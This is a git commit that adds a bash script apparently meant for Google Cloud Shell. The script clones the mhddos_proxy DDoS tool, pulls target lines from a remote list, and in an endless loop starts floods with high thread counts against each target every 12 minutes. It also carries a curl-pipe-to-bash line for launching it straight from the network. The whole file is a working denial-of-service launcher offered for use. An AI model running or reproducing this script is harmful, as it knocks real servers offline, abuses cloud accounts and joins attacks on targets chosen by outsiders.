59660a9125a92c4d0ee213f655735ff1c01345c2
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-19 12:05:37 +0300

    Create Start_L4_noLog.sh

---
+++ Start_L4_noLog.sh
@@ -0,0 +1,25 @@
+#!/bin/bash
+#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/Start_L4_noLog.sh | bash
+git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
+cd mhddos_proxy
+python3 -m pip install -r requirements.txt
+
+threads="${1:-1000}"; threads="-t $threads"
+rpc="--rpc 1000"
+
+while true
+do
+   pkill -f runner.py 
+   list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]" | wc -l)
+   while [[ $list_size = "0"  ]]
+      do
+            sleep 5
+            list_size=$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]" | wc -l)
+      done
+   for (( i=1; i<=list_size; i++ ))
+      do
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L4t.lst | cat | grep "^[^#]")")
+            python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc&
+      done
+sleep 12m
+done
